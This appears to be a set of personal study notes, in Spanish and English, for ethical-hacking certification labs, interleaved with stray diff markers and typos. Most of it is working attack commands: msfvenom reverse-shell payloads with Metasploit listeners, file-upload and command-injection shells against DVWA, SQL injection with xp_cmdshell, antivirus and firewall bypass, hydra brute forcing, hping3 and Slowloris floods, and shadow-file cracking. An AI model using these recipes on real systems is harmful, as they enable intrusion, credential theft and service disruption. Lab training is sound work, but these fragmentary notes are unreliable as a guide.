 Route –n
Host file sudo nano /etc/hosts 
TTL (64 Linux and 128 Windows) 

pagina linux gtfobins.github.io

Footprinting 
Google Dock 
@@ -12,6 +13,9 @@ intitle:login site:eccouncil.org
More examples in:  
ExploitDB 

wordlist 
/usr/share/seclists/Discovery/web-content/directory-list-2.3-medium.txt


dirb  
dirb http://target 
@@ -103,6 +107,11 @@ Nmap –T5 –sS –sV –O (Ip)  ss sigiloso, sv version
sudo nmap –sS -T4 -A 10.10.100.144 
nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10 

Uniscan ETag
uniscan -u movies.google.com
Curl -I 192.168...

wpscan --url http:// .....com/wp-login.php -U ./username.txt -P ./password.txt

Telnet 
telnet Ip 22 
@@ -119,10 +128,17 @@ Ssh –p 2222 admin@192.168.1.10 /  Puerto
Ssh –i /ruta/a/tu/clavepriva admin@192.168.1.10 / con clave privada 
Ssh –i id_rsa usuario@IP 

ssh -i key.pem admin@10.10.170.80
ssh -i key.pem john@10.10.170.80

FTP21 
ftp 10.10.223.330  
SMB22 
hydra -l mike -P /usr/share/wordlist/rockyou.txt -v 10.10.223.20 ftp

SMB22
sudo nmap --script smb-os-discovery.nse IP
sudo nmap -p445 --script smb-os-discovery.nse 192.168.18.110
cd /usr/share/nmap/scripts; ls| grep smbpython3 dirsearch.py ​​-u http://www.moviescope.com -x 403
enum4linux [options] ip -U             
get userlist -M             -N             -S             -P             -G             -a             
get machine list 
@@ -152,6 +168,14 @@ Host:192.168.1.20\


Wireshark 
http://testphp.vulnweb.com/
filtros
http.request.method==POST  .... credenciales 
ftp ..... ftp 
tcp.flags.syn==1 and tcp.flags.ack==0    .... DDOS
tcp.flags.syn==1 and tcp.flags.ack==0     ..... DDOS
tcp.flags.syn ==1 
mqtt
Wireshark captura.cap  
Vulnerabilidades 
Consulta de vulnerabilidades 
@@ -163,6 +187,8 @@ Cve.circl.Iu --
Gvm-start 
Open web  
127.0.0.1:9392 


Hydra 
hydra -l USER_NAME -P password_file TARGET_IP smb 
smbclient //target_ip/ -U USER_NAME  
@@ -175,9 +201,10 @@ snow.exe -C -p “pass” file.txt

netbios  
cmd 
nbtstat –a 10.10.1.11 
nbtstat –
nbstat –c 
net use  
nmap -sU -p 137 --script nbstat.nse 192.168 ....


snmp walk 
@@ -189,6 +216,7 @@ Python3 billcipher.py
Dig  
Dig www.certifiedhacker.com axfr zona transfer 


Metasploit  
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe (optional -e x86/shikata_ga_nai -b "\x00") LHOST=IP 
LPORT=PORT -o RUTA 
@@ -337,10 +365,7 @@ hping3 -d 65538 -S -p 21 --flood (Dirección IP de destino) -d : especifica el t
flood : envía una gran cantidad de paquetes. 
A inundación en capa de aplicación UDP 
hping3 -2 -p 139 --flood (Dirección IP de destino) -2 : especifica el modo UDP; -p : especifica el puerto de destino; y --flood : cantidad de paquetes. 
 
 
 
 

CharGEN (Puerto 19) 
SNMPv2 (Puerto 161) 
QOTD (Puerto 17) 
@@ -442,8 +467,11 @@ nmap -T4 -A -p 80,443 192.168.x.x/2x
hydra -L username_file -P password_file TARGET_IP telnet 
hydra -L username_file -P password_file TARGET_IP ssh 

DVWA


Stego 
https://stegonline.georgeom.net/upload
Select Extract Data 
Upload file and select path of destination 
Use any pointer from the question as keyword where applicable 
@@ -456,6 +484,27 @@ get file
View Content: 
cat file 

SNOW
http://darkside.com.au/snow
SNOW.EXE -C -m "hasan is my name" -p " magic" test.txt test2.txt
-m mensaje a ocuptar
-p passw
test.txt fila original 
test2.txt is la fila objetivo 

Descifra
SNOW.EXE -C -p "magic" test2.txt


Nikto
nikto -h | view command help| -H for full help text
nikto -h http://www.goodshopping.com -Tuning 1 |-Tuning 1 Scan tuning  1=Interesting File / Seen in logs
---
nikto -h movies.ceorg.com   para encontrar servidor 


zaproxy
http://movies c.com 

Exploiting misconfigured NFS (port 2049) 
* `nmap -sV —p 2049 IP9/Subnet` 
@@ -478,9 +527,275 @@ ssh smith@192.168.0.x
* `ls -la` 
* Find the flag: `find / -name "*.txt" -ls 2> /dev/null` 

whatweb 
nmap -sV --script=http-enum [dominio de destino o dirección IP]
gobuster dir -u [Sitio web de destino] -w /home/attacker/Desktop/common.txt

cd dirsearch/ enumeracion directorios sitio web
python3 dirsearch.py ​​-u http://www.moviescope.com
 python3 dirsearch.py ​​-u http://www.moviescope.com -e aspx
python3 dirsearch.py ​​-u http://www.moviescope.com -x 403
Aircrack 
aircrack-ng -b <bssid from wireshark> -w <path to word list> < pcap file> 
Crypto  
Hashes.com 
veracrypt 
10 Malware

Parameter Tampering and XSS
•	Change id parameter in profile to view other profiles.
•	For XSS, type the script in comments field in contact page. (This is stored XSS and will be shown to every user who views the contact tab)

WPScan and Metasploit – Enumerating and Web App Hacking
•	Use wpscan --url http://[IP Address of Windows Server 2012]:8080/CEH --enumerate u | enumerate user list
•	In msfconsole use auxiliary/scanner/http/wordpress_login_enum
•	Type set PASS_FILE /root/Desktop/Wordlists/Passwords.txt
•	Type set RHOSTS [IP Address of Windows Server 2012]
•	Type set RPORT 8080
•	Type set TARGETURI /CEH/ or complete URL
•	Type set USERNAME admin and press Enter to set the username as admin.
•	Type run
•	Use URL http://[IP Address of Windows Server 2012]:8080/CEH/wp-login.php to login.

Remote Command Execution - Exploiting Vulnerability in DVWA
•	http://10.10.10.12:8080/dvwa | gordonb:abc123
•	Set Security settings to low
•	| hostname
•	| whoami
•	| tasklist
•	| dir C:\
•	| net user
•	| net user <username> /add | add custom user
•	| net user <username>
•	| net localgroup Administrators <username> /add | add user to admin group

VEGA -Web Application Audit (Kali)
•	Open from Web application analysis
•	Start New Scan
•	Enter URL http://10.10.10.12:8080/dvwa 
•	Select all modules
•	Leave rest settings as default and start.
Acunetix WVS (Windows)
•	Install with password qwerty@1234 and port 13443
•	Add target. http://www.moviescope.com
•	Run Full Scan with OWASP 2013 report.
•	

File Upload Vulnerability – All Levels DVWA
Payload Creation
•	msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw | create a raw php code
•	Copy the code in a text file and save as .php
Low Level Exploitation
•	Upload the file | note the path /dvwa/hackable/uploads/<filename>.php
•	Run listener by starting msfconsole
•	Type use exploit/multi/handler.
•	Type set payload php/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit
•	Browse link of file to start meterpreter session.
Medium Level Exploitation
•	Rename file as <filename>.php.jpg
•	While uploading, intercepting with burp and rename back to <filename>.php
•	Run listener by starting msfconsole
•	Type use exploit/multi/handler.
•	Type set payload php/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit
•	Browse link of file to start meterpreter session.
High Level Exploitation
•	Open the <filename>.php file and add code GIF98 at start and save file as <filename>.jpg
•	Upload file
•	Now go to command execution tab and use command <Some IP>||copy C:\wamp64\www\DVWA\hackable\uploads\<filename>.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php
•	Run listener by starting msfconsole
•	Type use exploit/multi/handler.
•	Type set payload php/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit
•	Browse link of file to start meterpreter session.

SQL INJECTION
Manual Injection 
•	‘ or 1=1 -- | for login bypass
•	‘insert into login values ('john','apple123'); -- | create own user in the database
•	‘create database mydatabase; -- | create database with name of mydatabase
•	‘exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- | execute ping on moviescope

N-Stalker Free X - Web Application Security Scanner
•	Open tool, Enter URL http://www.goodshopping.com and select OWASP Policy, Click Start Scan Wizard.
•	Leave Settings as default and start session.
•	Start scan. Wait for scan to complete to view results.

SQLMAP
•	Login into website, Get user session cookie via document.cookie is console.
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> --dbs
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D <database name> --tables
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D <database name> -T <table name> --columns
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> -D <database name> -T <table name> --dump
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie values”> --os-shell


CLOUD COMPUTING
Using owncloud
•	Hosted at ubuntu machine http://10.10.10.9/owncloud. admin:qwerty@123
•	Create users and share files to users.
•	Install Desktop client and share and view files
ClamAV Protection of cloud
Cloud is currently protected by ClamAV so no malicious file is uploaded.

Bypassing ClamAV
•	msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf | generate a linux based executable
•	Type use multi/handler
•	Type set payload linux/x86/shell/reverse_tcp
•	Type set LHOST 10.10.10.11
•	Type set LPORT 4444
•	Type run
•	Upload payload in shared folder.
•	Download using admin, Set permission to chmod -R 755 exploit.elf
•	Execute exploit ./exploit.elf
DOS Attack using Slowloris.pl script
•	Open Slowloris folder 
•	Run chmod 777 Slowloris.pl
•	Execute script ./solaris.pl -dns 10.10.10.9
•	DOS attack successful

CRYPTOGRAPHY
HASHCALC
Easy to use GUI based. Supports text and files

MD5 CALCULATOR
Easy to use, integrates with explorer right click. Right Click any file and select MD5 Calculator to calculate its MD5 Hash.

CRYPTOFORGE
•	Install and it will appear as an encrypt when right clicking on files.
•	To Encrypt open cryptoforge text and enter your text here and use a passphrase to encrypt

BCTEXTENCODER
Simple GUI based. Enter text and encode it using password.

CREATING SELF-SIGNED CERTIFICATE
•	Open inetmgr
•	Click machine name and select Server Certificates
•	From actions select Create Self signed Certificate
•	Choose Name and Personal.
•	Go to a Site, choose Bindings from the Action pane.
•	Select Add.
•	Select Https, IP 10.10.10.16, hostname www.goodshopping.com, select the certificate.
•	Go the site and right click refresh one time.

VERACRYPT - DISK ENCRYPTION
Create Encrypted containers which can be mounted as Virtual Disks.
Creation
Create Volume  Create an Encrypted File Container  Standard VeraCrypt volume  Volume Location (Path to save the container)  Encryption AES Hash SHA-512  Size of Volume  Enter Password  Generate mouse randomness  Format Exit
Mount Volume
Select Drive Letter  Select File  Mount  Enter Password  Disk shown in Explorer

CrypTool – Data Encryption
File  New  Enter Text  Encrypt/Decrypt  Symmetric (Modern)  RC2  KEY 05  Encrypt
File  Open  Encrypt/Decrypt  Symmetric (Modern)  RC2  KEY 05  Decrypt


HACKING MOBILE PLATFORMS
Generating and Executing Payloads for Android
Setup Android
•	Open terminal, run su
•	Run ip addr add 10.10.10.69/24 dev eth0
Generate Payload
•	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk | R raw
•	Host the payload and run a listener on Kali
•	Type use exploit/multi/handler.
•	Type set payload android/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit -j -z
•	Browse link of file to start meterpreter session.
Exploit Execute
•	Open kali hosted link. Download APK using es file downloader. Install and run.


Extras

Metasploit – Firewall Bypass
•	Turn on firewall on victim machine
Payload Setup
•	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe | -e encoder, -b list of bad characters to avoid
•	Type mkdir /var/www/html/share | make directory
•	Type chmod -R 755 /var/www/html/share | change rights recursively to all files and folders inside
•	Type chown -R www-data:www-data /var/www/html/share | change owner recursively  owner:group
•	mv /root/Desktop/Test.exe /var/www/html/share | move to exploit
•	service apache2 start

Listener Setup
•	Type use exploit/multi/handler.
•	Type set payload windows/meterpreter/reverse_tcp.
•	Type set LHOST 10.10.10.11.
•	Start listener, type exploit -j -z |exploit -j -z exploit tells Metasploit to start the exploit. The -j flag tells it to run in the context of a job and -z simply means to not interact with the session once it becomes active.
Execute Exploit
•	Open http://10.10.10.11/share on victim machine. Download Payload and run.
•	Type sessions -i to view sessions 
•	Type sessions -i 1 to interact with the session created 
•	Type execute -f cmd.exe -c -H | creates a channel to execute the victim command shell
•	Now Type shell | opens an interactive shell (cmd)
•	Type netsh firewall show opmode | to shown firewall stats
•	Type netsh advfirewall set allprofiles state off | to turn off firewall.
•	Type getsystem 
•	Type ps | processes

Dvwa
&& ls
& ls
; ls
| ls
&& nc -c sh 127.0.0.1 9001


john 
RSA private
ssh2john key.txt > hash.txt
john hash.txt -w=/usr/share/wordlists/john/lst
john hash.txt --show
john hash.txt -w/usr/share/wordlists/rockyou.txt

escalar privilegios 
sudo -l
cat /etc/passwd
seleccionar  y copiar 
nano passwd
pegar 
ctrl s
ctrlx
sudo cat /etc/shadow
Seleccionar y copiar
nano shadow
pegar 
ctrl s ctl x
unshadow passwd shadow > pwd.txt
john pwd.txt -w=/usr/share/wordlists/jhon.lst

Su root
cd /root
ls
cat root.txt


Clickjacking 
clickjack github
git clone https... 
cd clickjack 
chmod +X*
python3 clickjack.py www.gooshopong.com

wathweb www.certifiedhacker.com version de nigx











